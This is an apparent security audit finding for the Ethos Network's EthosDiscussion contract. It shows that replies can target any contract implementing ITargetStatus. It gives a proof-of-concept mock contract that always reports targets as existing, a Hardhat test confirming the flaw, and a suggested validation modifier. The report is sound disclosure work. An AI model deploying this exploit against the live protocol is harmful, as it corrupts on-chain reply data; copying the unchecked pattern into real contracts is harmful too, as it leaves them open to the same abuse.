# `EthosDiscussion::_checkIfTargetExistsAndAllowed` does not sufficiently checks if the target contract is from ethos contracts

### Summary

The [`EthosDiscussion::_checkIfTargetExistsAndAllowed`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L299) will allow anyone to use their own contract as `target` contract given they implement the [`ITargetStatus.sol`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/interfaces/ITargetStatus.sol) interface which would lead the unwanted side effects such as increase of `replyCount`, `Reply` creation,  event emission and replying to non-existent items

### Root Cause

The [`EthosDiscussion::_checkIfTargetExistsAndAllowed`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L299) lacks checks to verify if the target contract is valid.

```solidity
  function _checkIfTargetExistsAndAllowed(address targetContract, uint256 targetId) private view {
@>  (bool exists, ) = ITargetStatus(targetContract).targetExistsAndAllowedForId(targetId); // @audit - no valid targetContract check as well as it unlocks the potential of re-entrancy.

    if (!exists) {
      revert TargetNotFound(targetContract, targetId);
    }
  }
 ```

The developer docs in `EthosDiscussion` contract state:
```solidity
@dev The EthosDiscussion contract enables users to leave text-based comments on virtually any activity item within the network.
These include vouches, attestations, reviews, profiles, or even other comments. Comments can be viewed and created through the Ethos app.
 ```
Which contradicts the intended behaviour.

### Internal pre-conditions

1. Attacker needs to have a valid profile.

### External pre-conditions

1. Attacker needs to deploy a contract of his own which implements the [`ITargetStatus.sol`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/interfaces/ITargetStatus.sol) interface

### Attack Path

1. Attacker will call the [`addReply`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L105) function with a `targetId` and `targetContract` of his own.

### Impact

This leads to unwanted side effects such as increase of `replyCount`, `Reply` creation as well as event emission on actions which are potentially being made outside of the intended Ethos contracts.
Also allows to add reply to non-existent items.

### PoC

The contract `MaliciousTargetContract.sol` given below was added inside the `contracts/mocks` 

// File: MaliciousTargetControl.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { ITargetStatus } from "./../interfaces/ITargetStatus.sol";

contract MaliciousTargetContract is ITargetStatus {

    // Ensuring we comply with the ITargetStatus
    function targetExistsAndAllowedForId(
        uint256 _targetId
    ) external view returns (bool exists, bool allowed) {

        return (true, true);
    }

}
```
In the file [`EthosDiscussion.test.ts`](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/test/EthosDiscussion.test.ts) add the below line in the `deployFixture` function
```javascript
    const maliciousTargetContract = await ethers.deployContract('MaliciousTargetContract', []);
```
and then proceed to export it at the end.
```javascript
    return {
     // rest of the exports
      maliciousTargetContract
    };
```
Add the following test case:
```javascript
  describe('addReply', () => {

    // Rest of the test cases

    it('should add reply to a contract outside of Ethos ecosystem', async () => {
      const {
        ethosProfile,
        maliciousTargetContract,
        COMMENTER_0,
        OWNER,
        ethosDiscussion,
      } = await loadFixture(deployFixture);

      // add reply
      await ethosProfile.connect(OWNER).inviteAddress(COMMENTER_0.address);
      await ethosProfile.connect(COMMENTER_0).createProfile(1);
      await expect(
        ethosDiscussion
          .connect(COMMENTER_0)
          .addReply(maliciousTargetContract, 0, defaultReplyContent, defaultReplyMetadata),
      )
        .to.emit(ethosDiscussion, 'ReplyAdded')
      
      expect(await ethosDiscussion.replyCount()).to.equal(1);

    })
  });
```
 This test case would pass proving the vulnerability.

### Mitigation

Consider adding a `isValidTarget` modifier similar to given below:
```solidity
  modifier isValidTarget(address target) {
    if (!contractAddressManager.checkIsEthosContract(target)) {
      revert InvalidTargetContract(target);
    }
    _;
  }
```
